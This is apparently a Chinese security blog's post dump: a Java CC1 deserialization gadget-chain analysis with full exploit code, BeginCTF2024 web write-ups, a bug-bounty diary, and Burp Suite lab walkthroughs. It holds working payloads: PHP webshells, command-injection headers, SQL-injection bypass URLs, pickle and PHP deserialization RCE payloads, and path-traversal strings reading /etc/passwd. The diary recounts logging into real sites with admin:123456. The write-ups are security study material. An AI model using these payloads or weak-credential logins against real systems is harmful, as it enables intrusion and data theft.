执行上述代码即可弹出计算器，然而，溯源还未结束，我们接着找调用了setValue方法的类。 2.3 起点–AnnotationInvocationHandler类经查找可得： 该类中调用setValue方法的代码如下： 两个if语句，第一个if判断注解中是否有成员变量，第二个if判断是否能够强转。 可见此类中利用的setValue方法恰好写在readObject方法中，只要我们能够控制里边的参数，便可大功告成。 于是我们去找该类的构造器： 12345678910AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123; //需要传入两个参数，第一个参数是一个类对象，表示注解的类型；第二个参数需要传入Map，因此传入TransformedMap即可 Class&lt;?&gt;[] superInterfaces = type.getInterfaces(); if (!type.isAnnotation() || superInterfaces.length != 1 || superInterfaces[0] != java.lang.annotation.Annotation.class) throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;); this.type = type; this.memberValues = memberValues;&#125; 接下来第一个参数的构造需要符合这几个if条件，首先，需要是注解类型；其次，内部需要有成员变量，以便在for循环的Map遍历中通过。 像常见的Override注解： 不包含任何成员变量。 因此，我们选用Target注解： 与此同时，更改map.put(“value”,”value”)，使其memberType不为空。 但还有一个问题，那就是AnnotationInvocationHandler类并没有public属性，因此仅能够在sun.reflect.annotation这个包下边调用，因此我们就需要用到反射来实现外部调用。 经过上述溯源，我们成功找到了一条链，接下来我们需要将其以代码形式串联起来。 3.构造链3.1 反射获取Runtime实例Runtime是单例类，且不继承Seralizeable接口，无法在序列化时写入文件，而它的原型类Class则继承了Seralizeable接口，因此我们使用反射获取其原型类。 12345Class rc=Class.forName(&quot;java.lang.Runtime&quot;); //获取类原型Method getRuntime = rc.getDeclaredMethod(&quot;getRuntime&quot;,null);Runtime r = (Runtime) getRuntime.invoke(null,null);Method exec = rc.getDeclaredMethod(&quot;exec&quot;,String.class);exec.invoke(r,&quot;calc&quot;); 这样便可实现序列化，我们采用InvokerTransformer类的transform方法实现上述过程： 1234Class rc = Class.forName(&quot;java.lang.Runtime&quot;);Method getRuntime = (Method)new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);Runtime r = (Runtime) new InvokerTransformer(&quot;getRuntime&quot;,new Class[]&#123;Object.class,Object.class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntime);new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r); 3.2 使用ChainedTransformer类简化过程1234567891011public ChainedTransformer(Transformer[] transformers) &#123; super(); iTransformers = transformers;&#125;public Object transform(Object object) &#123; for (int i = 0; i &lt; iTransformers.length; i++) &#123; object = iTransformers[i].transform(object); &#125; return object;&#125; ChainedTransformer类中存在的transform方法类似于递归调用，因此我们可以以数组的形式传入InvokerTransformer类的transform方法实现的获取Runtime实例的过程，故更改代码如下： 1234567Transformer[] transformers=new Transformer[]&#123; new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);chainedTransformer.transform(Runtime.class); 然而，在实际的环境中，我们不可能直接调用chainedTransformer的transform方法来传入Runtime.class。因此，我们需要将Runtime.class作为递归的开头传入进去，而直接传入是不可能的，我们需要一个类来作为载体。与此同时，我们还忽略了一个问题，那就是AnnotationInvocationHandler类中的setValue参数不可控。 3.3 ConstantTransformer类的引入先来看一下该类的源码： 12345678public ConstantTransformer(Object constantToReturn) &#123;//构造器 super(); iConstant = constantToReturn;&#125;public Object transform(Object input) &#123;//transform方法 return iConstant;&#125; 该类的transform方法很有意思，无论传入何值，均会返回构造时传入的常量，因此，我们可以直接将Transformer数组改成如下： 123456Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;; 3.4 构造完成完整的CC1链如下所示： 123456789101112131415161718192021Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();map.put(&quot;value&quot;,&quot;value&quot;);Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map,null,chainedTransformer);//反射获取AnnotationInvocationHandler类Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor constructor = c.getDeclaredConstructor(Class.class,Map.class);constructor.setAccessible(true);Object o = constructor.newInstance(Target.class,transformedmap);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));oos.writeObject(o);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));ois.readObject(); 成功执行便会弹出计算器： 4.思路转换本次分析的CC1链是国内基于TransformerMap类的链，而我们常用的ysoerial中的则是国外基于LazyMap的链，其思路如下： payload也和之前的类似，不过是将TransformerMap改为了LazyMap，利用方法由checkSetValue变为了get，并多了一步Proxy触发invoke方法，至于注解类型，由于我们利用的是get方法，所以不需要进入if，直接随便传一个注解就可以了。最后使用AnnotationInvocationHandler类进行包装，毕竟我们需要使用它的readObject方法进行反序列化。 1234567891011121314151617181920212223Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();map.put(&quot;value&quot;,&quot;value&quot;);LazyMap innerMap = (LazyMap) LazyMap.decorate(map, chainedTransformer);//反射获取AnnotationInvocationHandler类Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class,innerMap);Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]&#123;Map.class&#125;,handler);handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));oos.writeObject(handler);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));ois.readObject(); 5.总结总的来说，花费了好些天时间，才算是搞懂了一些皮毛，日后应当勤加复习，逐步积累，向着Web高手前进！！！","categories":[],"tags":[]},{"title":"BeginCTF2024_WEB_WP","slug":"BeginCTF2024_WEB_WP","date":"2024-02-07T03:20:54.991Z","updated":"2024-02-07T03:20:32.243Z","comments":true,"path":"2024/02/07/BeginCTF2024_WEB_WP/","link":"","permalink":"http://example.com/2024/02/07/BeginCTF2024_WEB_WP/","excerpt":"作者：Narcher 时间：2024&#x2F;2&#x2F;3 分类：writeup","text":"作者：Narcher 时间：2024&#x2F;2&#x2F;3 分类：writeup zupload系列1.这一系列的题目基本上都是考察简单的代码审计，论难度只能算是签到题。 2.所有题目均会先贴出源码。 zupload 本题对action的赋值无过滤，因此可直接读flag，payload:?action=/flag zupload-pro 本题禁止了目录穿越，但限制条件不多，可直接用php伪协议读取文件。 payload:?action=php://filter/convert.base64-encode/resource=/flag base64解码即可：begin{is_tHis_4_wE85heLL_069b22e704f1} zupload-pro-plus 本题做法同上，payload:?action=php://filter/convert.base64-encode/resource=/flag 从源码改动上来看，出题人应该是想让选手进行后缀双写绕过，但应该是出题的时候不严谨，导致有多种做法，因此不再过多赘述 zupload-pro-plus-enhanced 作者在本题进行了加固，只能进行双写后缀的形式绕过 方法如下： 1.一句话木马&lt;?php @eval(system(&#39;cat /flag&#39;))?&gt;写入1.php2.改后缀名为1.zip3.上传时拦截数据包改名为1.zip.php4.访问http://ip:port/uploads/1.zip.php zupload-pro-plus-max 本题考点：include()函数包含文件时不考虑文件后缀，并且会将文件内容当作php代码执行 方法如下： 1.创建1.txt里边写上php一句话木马&lt;?php eval(system(&quot;cat /flag&quot;));?&gt;2.压缩为1.zip上传3.访问uploads&#x2F;1.zip，include()函数自动解析1.txt内的内容即可获取&#x2F;flag zupload-pro-plus-max-ultra 本题考点：$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些额外的项目。 $_SERVER[‘PHP_SELF’] 当前执行脚本的文件名，与 document root 有关。例如，在地址为 http://example.com/test.php/foo.bar 的脚本中使用 $SERVER[‘PHP_SELF’] 将得到 &#x2F;test.php&#x2F;foo.bar。__FILE_ 常量包含当前(例如包含)文件的完整路径和文件名。 从 PHP 4.3.0 版本开始，如果 PHP 以命令行模式运行，这个变量将包含脚本名。之前的版本该变量不可用。 $_SERVER[‘GATEWAY_INTERFACE’] 服务器使用的 CGI 规范的版本；例如，”CGI&#x2F;1.1”。 $_SERVER[‘SERVER_ADDR’] 当前运行脚本所在的服务器的 IP 地址。 $_SERVER[‘SERVER_NAME’] 当前运行脚本所在的服务器的主机名。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。(如: www.runoob.com) $_SERVER[‘SERVER_SOFTWARE’] 服务器标识字符串，在响应请求时的头信息中给出。 (如：Apache&#x2F;2.2.24) $_SERVER[‘SERVER_PROTOCOL’] 请求页面时通信协议的名称和版本。例如，”HTTP&#x2F;1.0”。 $_SERVER[‘REQUEST_METHOD’] 访问页面使用的请求方法；例如，”GET”, “HEAD”，”POST”，”PUT”。 $_SERVER[‘REQUEST_TIME’] 请求开始时的时间戳。从 PHP 5.1.0 起可用。 (如：1377687496) $_SERVER[‘QUERY_STRING’] query string（查询字符串），如果有的话，通过它进行页面访问。 $_SERVER[‘HTTP_ACCEPT’] 当前请求头中 Accept: 项的内容，如果存在的话。 $_SERVER[‘HTTP_ACCEPT_CHARSET’] 当前请求头中 Accept-Charset: 项的内容，如果存在的话。例如：”iso-8859-1,*,utf-8”。 $_SERVER[‘HTTP_HOST’] 当前请求头中 Host: 项的内容，如果存在的话。 $_SERVER[‘HTTP_REFERER’] 引导用户代理到当前页的前一页的地址（如果存在）。由 user agent 设置决定。并不是所有的用户代理都会设置该项，有的还提供了修改 HTTP_REFERER 的功能。简言之，该值并不可信。) $_SERVER[‘HTTPS’] 如果脚本是通过 HTTPS 协议被访问，则被设为一个非空的值。 $_SERVER[‘REMOTE_ADDR’] 浏览当前页面的用户的 IP 地址。 $_SERVER[‘REMOTE_HOST’] 浏览当前页面的用户的主机名。DNS 反向解析不依赖于用户的 REMOTE_ADDR。 $_SERVER[‘REMOTE_PORT’] 用户机器上连接到 Web 服务器所使用的端口号。 $_SERVER[‘SCRIPT_FILENAME’] 当前执行脚本的绝对路径。 $_SERVER[‘SERVER_ADMIN’] 该值指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数。如果脚本运行在一个虚拟主机上，则该值是那个虚拟主机的值。(如：&#115;&#x6f;&#109;&#x65;&#111;&#110;&#101;&#64;&#x72;&#x75;&#x6e;&#111;&#x6f;&#x62;&#46;&#99;&#x6f;&#109;) $_SERVER[‘SERVER_PORT’] Web 服务器使用的端口。默认值为 “80”。如果使用 SSL 安全连接，则这个值为用户设置的 HTTP 端口。 $_SERVER[‘SERVER_SIGNATURE’] 包含了服务器版本和虚拟主机名的字符串。 $_SERVER[‘PATH_TRANSLATED’] 当前脚本所在文件系统（非文档根目录）的基本路径。这是在服务器进行虚拟到真实路径的映像后的结果。 $_SERVER[‘SCRIPT_NAME’] 包含当前脚本的路径。这在页面需要指向自己时非常有用。FILE 常量包含当前脚本(例如包含文件)的完整路径和文件名。 $_SERVER[‘SCRIPT_URI’] URI 用来指定要访问的页面。例如 “&#x2F;index.html”。 （以上内容均来自菜鸟：PHP 超级全局变量 | 菜鸟教程 (runoob.com)） 方法如下： 1.burp抓包，在http头中添加X-Extract-To:.;cp &#x2F;flag . &#x2F;uploads&#x2F; 2.访问http://ip:port/uploads/flag zupload-pro-plus-max-ultra-premium 本题考点：软链接 软链接可以看成是Windows系统中的快捷方式，可以让你快速链接到目标文件或目录，它找到的是原文件名，通过原文件名找到真实的文件或目录，且软连接本身有自己的indoe 方法如下： 1.ln -s &#x2F;flag flag创建软连接文件 2.将文件压缩为zip格式上传 3.访问&#x2F;uploads&#x2F;flag即可访问到&#x2F;flag zupload-pro-revenge 本题考点：前端校验绕过（PS：任何前端校验都是不可信的） 方法如下： 1.一句话木马&lt;?php @eval(system(&#39;cat /flag&#39;))?&gt;写入1.php2.改后缀名为1.zip3.上传时拦截数据包改名为1.php4.访问http://ip:port/uploads/1.php sql教学局单纯的sql waf绕过，没什么技术含量 flag分为三部分，依次拿就是了 payload如下： 1231.http://ip:port/challenge.php?user=1%27/**/union/**/seselectlect/**/group_concat(flag)/**/frfromom/**/secret.passwoorrd%232.http://ip:port/challenge.php?user=1%27/**/union/**/seselectlect/**/group_concat(student,%27~%27,grade)/**/frfromom/**/scoorre/**/where/**/student/**/like/**/%27begin%27%233.http://ip:port/challenge.php?user=1%27/**/union/**/seselectlect/**/loloadad_file(&#x27;/flag&#x27;)%23 POPgadget考察php反序列化，这个题目有点坑人，flag在环境变量中，直接看phpinfo就可以了，耗费了很多时间 POP链构造：B::__destruct到A::__get到Fun::__call 别忘了将空字符改成%00，之后GET传参：?begin=O:1:&quot;B&quot;:2:&#123;s:1:&quot;p&quot;;s:7:&quot;phpinfo&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:1:&#123;s:9:&quot;%00Fun%00func&quot;;s:20:&quot;call_user_func_array&quot;;&#125;&#125;&#125; PS：后来才知道，这个phpinfo是个非预期，真正的解法实际上是把phpinfo改成env直接看环境变量（其实也差不多） pickelshop新知识点：考察pickel反序列化 register页面注册获取cookie，在login页面的http头中添加cookie会发现回显 因此在username中添加__reduce__函数进行命令执行 1234567891011121314151617181920import pickleimport base64class register(object): def __init__(self, username=&quot;test&quot;): self.username = username def __reduce__(self): return (eval, (&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;,))a = &#123;&#x27;username&#x27;: register(), &#x27;password&#x27;: &#x27;124&#x27;&#125;c = pickle.dumps(a, protocol=4)encoded_data = base64.b64encode(c)# 将base64字符串写入Output.txt文件中print(a)print(encoded_data) 之后改Cookie即可 readbooks本题考点：命令执行 &#x2F;public&#x2F;book*发现同时列出来了book1和book2的内容 因此直接&#x2F;list&#x2F;*获取当前目录所有文件名 再用&#x2F;public&#x2F;black*获取黑名单，&#x2F;public&#x2F;app*获取源码 源码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import osfrom flask import Flask, request, render_templateapp = Flask(__name__)DISALLOWED1 = [&#x27;?&#x27;, &#x27;../&#x27;, &#x27;/&#x27;, &#x27;;&#x27;, &#x27;!&#x27;, &#x27;@&#x27;, &#x27;#&#x27;, &#x27;^&#x27;, &#x27;&amp;&#x27;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;=&#x27;, &#x27;+&#x27;]DISALLOWED_FILES = [&#x27;app.py&#x27;, &#x27;templates&#x27;, &#x27;etc&#x27;, &#x27;flag&#x27;, &#x27;blacklist&#x27;]BLACKLIST = [x[:-1] for x in open(&quot;./blacklist.txt&quot;).readlines()][:-1]BLACKLIST.append(&quot;/&quot;)BLACKLIST.append(&quot;\\\\&quot;)BLACKLIST.append(&quot; &quot;)BLACKLIST.append(&quot;\\t&quot;)BLACKLIST.append(&quot;\\n&quot;)BLACKLIST.append(&quot;tc&quot;)ALLOW = [ &quot;&#123;&quot;, &quot;&#125;&quot;, &quot;[&quot;, &quot;pwd&quot;, &quot;-&quot;, &quot;_&quot;]for a in ALLOW: try: BLACKLIST.remove(a) except ValueError: pass@app.route(&#x27;/&#x27;)@app.route(&#x27;/index&#x27;)def hello_world(): return render_template(&#x27;index.html&#x27;)@app.route(&#x27;/public/&lt;path:name&gt;&#x27;)def readbook(name): name = str(name) for i in DISALLOWED1: if i in name: return &quot;banned!&quot; for j in DISALLOWED_FILES: if j in name: return &quot;banned!&quot; for k in BLACKLIST: if k in name: return &quot;banned!&quot; print(name) try: res = os.popen(&#x27;cat &#123;&#125;&#x27;.format(name)).read() return res except: return &quot;error&quot;@app.route(&#x27;/list/&lt;path:name&gt;&#x27;)def listbook(name): name = str(name) for i in DISALLOWED1: if i in name: return &quot;banned!&quot; for j in DISALLOWED_FILES: if j in name: return &quot;banned!&quot; for k in BLACKLIST: if k in name: return &quot;banned!&quot; print(name) cmd = &#x27;ls &#123;&#125;&#x27;.format(name) try: res = os.popen(cmd).read() return res except: return &quot;error&quot;if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;,port=8878) 黑名单过滤了许多，因此需要绕过 空格用$IFS$9代替，关键字使用&#39;&#39;绕过，执行的命令进行base64转换 payload: &#x2F;public&#x2F;$IFS$9`ec’’ho$IFS$9Lyo|ba’’se64$IFS$9-d` 读取根目录下所有文件 King本题参考beginCTF 2024 Web方向题解WP 全-CSDN博客","categories":[],"tags":[]},{"title":"记一次简单的公益SRC挖掘","slug":"记一次简单的公益SRC挖掘","date":"2024-02-05T12:51:02.491Z","updated":"2024-02-05T15:44:11.021Z","comments":true,"path":"2024/02/05/记一次简单的公益SRC挖掘/","link":"","permalink":"http://example.com/2024/02/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98/","excerpt":"作者：Narcher 时间：2024&#x2F;2&#x2F;5 分类：diary","text":"作者：Narcher 时间：2024&#x2F;2&#x2F;5 分类：diary 前言​ 开头吐槽一下，本来想批量挖thinkphp框架漏洞的，但试了一试发现行不通（挖不出来），甚至我在查资产的时候查到了黄色网站！！！于是在郁闷之际随便搞，看见一个网站就搞一个，准备碰碰运气，结果还真让我碰到一个弱口令漏洞，下面讲一讲具体过程。 ​ 这事还要从半个月前说起… ​ Smgg之前接了个活，让我们写一下ZoomEye的实战心得。实战心得嘛，肯定得挖出来点东西。作为一个没挖过洞的runoob，只能到时候现学现卖了，本来打算过两天去学的。但我忙着打BeginCTF去了，于是就忘了。 ​ 直到昨天，BeginCTF打的差不多了，WP也写完了，刚想起这么个事，于是便赶鸭子上架，学了一下大佬们的相关思路，开始实战！！！ 昨日收获​ 昨日，我复现了一篇大佬写的挖掘《用友U8-OA》的SQL注入漏洞的具体流程来作为练习。（特附上大佬的文章：Fofa搜索语法批量挖掘sql注入漏洞 - 知乎 (zhihu.com)） ​ 既然已经确定了想要挖掘的漏洞，首先利用ZoomEye进行信息搜集。 ​ （保险起见，给关键信息打码处理） 之后点击右侧的下载导出所有的信息。 为了进行简单的对比，我还在Fofa上搜集了相同的信息并导出。 之后便是批量处理，写个脚本即可，直接拿大佬的过来用也行。 最终收获了8个有漏洞的网站，但有几个能交上完全是未知数。。。。。。 12345PS:同时，作为昨日使用ZoomEye的心得，在此总结一下：1.ZoomEye确实挺好用的，和Fofa比起来也算是各有千秋，搜集信息的时候最好使用二者都搜一下，互相补足2.ZoomEye搜索子域名是一把好手 今日收获​ 今天本来想和昨天类似，整一个thinkphp的批量挖掘来练练手，结果就碰上了“前言”里写的那些poshi，但总之也是有收获的嘛。下面具体讲一下思路。 ​ 还是一如既往的搜集信息： ​ 本来是打算批量刷的，然而就在此时，我脑回路一抽，突然想着手打。可打着打着发现菜的一个也打不通，于是便玉玉地打弱口令，刚试了第一个，就成了。那么好运？？？ ​ 结果进去一看，是个空的，啥也没有，那弱口令自然也就没用了。后面仔细看了一下，感觉这个好像不是什么企业的，顶多是个人拿来玩的个IP。 ​ 不过也算是个开门红，之后本着试一试的心态接着尝试了七八次。欸嘿，还真来了。 ​ 直接admin:123456登进去，发现还真是管理员权限，里边还有敏感信息。 算个中高危，交了，嘿嘿。 1PS:今日份总结：狗运当头~~~ 咳咳，以为这样就结束了？我本来也是这样认为的，写完日记准备收工，但奈何手痒，又想多刷几下，于是在刷了三四下之后还真又狗运刷到一个弱口令，这次还是个edu的，芜湖~~~ 再次账号：admin，密码：123456拿下，仍然具有管理员权限。 交到edusrc，收工！ 等等，这么好挖，收什么工！！！！继续挖！！！！ 没5分钟，又来一个。 源源不断，又又又来一个。这个更厉害，敏感信息泄露，包括姓名，手机号，身份证等。 ​ 之后又挖到一个小的，按道理应该算是某个团队搭建的论坛，算了，统统交上。。。 已经23点半了，今天马上结束了，今天的挖洞也真正的到此为止了。太爽啦！！！ 1PS：今日份总结：鸿运齐天！！！","categories":[],"tags":[]},{"title":"Burpsuite靶场--Access_control(后四道)","slug":"Burpsuite靶场--Access_control(后四道)","date":"2024-01-10T08:19:59.663Z","updated":"2024-01-26T02:53:33.396Z","comments":true,"path":"2024/01/10/Burpsuite靶场--Access_control(后四道)/","link":"","permalink":"http://example.com/2024/01/10/Burpsuite%E9%9D%B6%E5%9C%BA--Access_control(%E5%90%8E%E5%9B%9B%E9%81%93)/","excerpt":"作者：Narcher 时间：2023&#x2F;10&#x2F;18 分类：writeup","text":"作者：Narcher 时间：2023&#x2F;10&#x2F;18 分类：writeup URL-based access control can be circumvented此网站在&#x2F;admin处有一个未经身份验证的管理面板，但前端不可访问，后端支持X-Original-Url，因此我们可以点击admin后抓包，将GET访问的&#x2F;admin改成&#x2F;，添加X-Original-Url:/admin，发现成功。 再根据返回的前端提示修改为/admin/delete，并GET传参?usernmae&#x3D;carlos，即可成功。 Method-based access control can be circumvented登录administrator，进入Admin panel，选择carlos，点击Upgrade user，并抓包，send to Repeater。 再登录wiener，随便点击任意页面，抓包获取cookie。 将更改权限数据包中的cookie改成wiener的cookie。 请求方式改成POSTX，返回缺少参数，之后再更改请求方法为GET，修改username为wiener，发送（此时一定要处于wiener登录的状态），即可成功。 Multi-step process with no access control on one step登录administrator，进入Admin panel，选择carlos，点击Upgrade user，并抓包，send to Repeater。之后还有一个页面询问Are you sure？，点击yes，同时抓包发送到repeater。 之后登录wiener，随便抓一个包获取cookie，进入repeater，将两个包依次修改为wiener的cookie和姓名并发包，即可成功。 Referer-based access control登录administrator，进入Admin panel，选择carlos，点击Upgrade user，并抓包，send to Repeater。 之后登录wiener，随便抓一个包获取cookie，进入repeater，修改为wiener的cookie和姓名并发包，即可成功。 后两题考点： ​ （图源：http://t.csdnimg.cn/zrhTX，侵删）","categories":[],"tags":[]},{"title":"Burpsuite靶场--Path_Traversal","slug":"Burpsuite靶场--Path_Traversal","date":"2024-01-10T04:04:03.310Z","updated":"2024-01-26T02:56:30.426Z","comments":true,"path":"2024/01/10/Burpsuite靶场--Path_Traversal/","link":"","permalink":"http://example.com/2024/01/10/Burpsuite%E9%9D%B6%E5%9C%BA--Path_Traversal/","excerpt":"作者：Narcher 时间：2024&#x2F;1&#x2F;10 分类：writeup","text":"作者：Narcher 时间：2024&#x2F;1&#x2F;10 分类：writeup File path traversal, simple case随便打开一个博客，抓包，将?filename&#x3D;后的数据改成../../../../../etc/passwd即可。 File path traversal, traversal sequences blocked with absolute path bypass在这道题目中，..被禁用。因此我们无法使用相对路径../解题，仅能使用绝对路径/解题。 （在Linux系统中，文件路径是非常重要的。&#x2F;etc&#x2F;passwd和etc&#x2F;passwd看起来很相似，但实际上它们指向的是完全不同的位置。 /etc/passwd：这是一个绝对路径，它从文件系统的根目录/开始，指向etc目录下的passwd文件。这个文件存储了系统中所有用户的基本信息。 etc/passwd：这是一个相对路径，它从当前工作目录开始，指向当前目录下的etc子目录中的passwd文件。如果当前工作目录下没有etc子目录或者etc子目录中没有passwd文件，那么这个路径就无法正确地找到文件。） 因此，将?filename&#x3D;后的数据改成/etc/passwd即可。 File path traversal, traversal sequences stripped non-recursively非递归地剥离遍历序列时，使用....//或....\\/将其恢复成正常遍历序列。 将?filename&#x3D;后的数据改成....//....//....//etc/passwd即可。 File path traversal, traversal sequences stripped with superfluous URL-decode根据题目描述，本题需要通过url编码来绕过过滤，因此对..&#x2F;进行两次url编码。 将?filename&#x3D;后的数据改成%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66etc/passwd即可。 File path traversal, validation of start of path本题的目录遍历必须以预期的基文件开头即/var/www/images/，因此将?filename&#x3D;后的数据改成/var/www/images/../../../../etc/passwd即可。 File path traversal, validation of file extension with null byte bypass本题的目录遍历对文件名后缀的验证，因此我们可以使用%00截断。 将?filename&#x3D;后的数据改成../../../../../etc/passwd%00.jpg即可。","categories":[],"tags":[]},{"title":"Burpsuite靶场--Authentication","slug":"Burpsuite靶场--Authentication","date":"2023-12-03T14:37:29.364Z","updated":"2024-01-26T02:55:59.870Z","comments":true,"path":"2023/12/03/Burpsuite靶场--Authentication/","link":"","permalink":"http://example.com/2023/12/03/Burpsuite%E9%9D%B6%E5%9C%BA--Authentication/","excerpt":"作者：Narcher 时间：2023&#x2F;10&#x2F;18 分类：writeup","text":"作者：Narcher 时间：2023&#x2F;10&#x2F;18 分类：writeup Broken brute-force protection, IP block打开靶场，进入login界面，随便输入账号密码然后burp抓包，之后发送到Intruder模块，模式选择Pitchfork。 由于每错次个就会封ip，所以我们需要在需要爆破的用户名和密码中交替插入正确的用户名和密码，并保证一一对应。 利用notepad++的替换功能，制作字典。 密码字典同理。 之后分别在payload1和payload2导入字典，设置线程数为1，即可开始爆破。 设置筛选carlos 找到长度异常的请求，使用其payload1和payload2登录成功 Username enumeration via account lock本题重复登录5次就会锁定账号，所以把所有账号进行5次枚举，使用Intruder中的Cluster bomb 发现异常数据，猜测auth为用户名，故爆破其密码（虽然有锁定，但我们可以观察报错信息），选用Sniper 发现123456789为密码时报错信息长度异常，使用auth:123456789登录，成功 2FA broken logic先登录wiener:peter，在burp的target-map下找到此网站的login2 尝试将verify修改为我们要攻击的账号，故退出登录，重新登录wiener:peter，只是这次拦截login2，先放过第一个包，再拦截第二个包和第三个包并修改verify为carlos，完成之后发现还要输入验证码，根据登录wiener:peter的经验可知验证码是4位纯数字组合，因此我们直接爆破即可 得验证码为1657，之后输入验证码同时拦截包，将verify改为carlos，即可成功 Brute-forcing a stay-logged-in cookie首先根据现有凭据登录，并勾选stay logged in 登录之后发现存在stay-logged-in base64解密得:wiener:51dc30ddc473d43a6011e9ebba6ca770 后面的部分用MD5解密得到peter 于是我们先退出登录，之后对stay-logged-in进行爆破 需要设置好payload的处理方式，先对密码进行MD5加密，之后添加前缀carlos:，最后进行baes64加密，之后开始爆破 根据长度排序 Y2FybG9zOjlkZjNiMDFjNjBkZjIwZDEzODQzODQxZmYwZDQ0ODJj base64解密：carlos:9df3b01c60df20d13843841ff0d4482c MD5解密：access 成功 Offline password cracking首先利用现有凭据wiener:peter登录，之后去首页随便找一篇博客评论 之后去access log里找到stay-logged-in：Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz base64解密：carlos:26323c16d5f4dabff3bb136f2460a943 MD5解密：onceuponatime 之后删除carlos的账户即可成功 Password reset poisoning via middleware首先，点击忘记密码，输入carlos的用户名，点击submit后用burp拦截，在header位置添加X-Forwarded-Host并指向自己的服务器 之后去服务器的日志中查看发现获取到了carlos的token：3ek1baacsobkwf15q6sqjetimcb6atm8 之后登录wiener的账号并去获取wiener的邮箱账号，并填写在忘记密码页面的信息栏中 前往邮箱获取到重置密码的url，将token改为carlos的token并访问 修改好密码后在点击提交时拦截，将token改为carlos的token并发送 之后用修改后的密码登录carlos即可成功 Password brute-force via password change首先登录wiener:peter，之后通过修改密码查看返回信息 当原密码正确，新密码不一致时，提示New passwords do not match 当原密码错误，新密码不一致时，提示Current password is incorrect 因此我们可以使用新密码不一致来爆破原密码 载入字典，并设置好匹配关键字 爆破成功 之后使用carlos:654321登录即可完成 Broken brute-force protection, multiple credentials per request登录拦截，发现以json格式发送登录凭据 故将字典修改格式 之后以[数据块]的格式发送密码即可成功 2FA bypass 